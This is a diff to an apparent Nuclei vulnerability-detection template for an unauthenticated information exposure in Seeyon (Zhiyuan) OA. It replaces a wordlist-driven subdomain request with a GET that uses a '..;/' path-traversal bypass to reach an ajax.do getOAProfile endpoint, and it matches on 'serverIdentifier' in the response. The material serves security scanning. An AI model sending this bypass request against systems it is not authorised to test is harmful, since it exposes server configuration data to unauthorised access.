@@ -4,25 +4,20 @@ info:
   name: Zhiyuan Oa Unauthorized
   author: pikpikcu
   severity: low
-  reference: https://buaq.net/go-53721.html
-  tags: seeyon,unauth
+  description: Zhiyuan Oa is exposed.
+  reference:
+    - https://buaq.net/go-53721.html
+  metadata:
+    max-request: 1
+  tags: seeyon,unauth,zhiyuan,misconfig
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
 
-    raw:
-      - |
-        GET /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
     matchers-condition: and
     matchers:
-
       - type: word
         words:
           - "serverIdentifier"
@@ -37,3 +32,4 @@ requests:
       - type: status
         status:
           - 200
+# digest: 4b0a00483046022100cb6bc97849da1048df86e13e8108ce3a957bb1a598303f0032b0b3baec166adc022100b3c193da6db924d416845fb22c011e9775c2baa56d489b5db432ad5238d2b453:922c64590222798bb761d5b6d8e72950
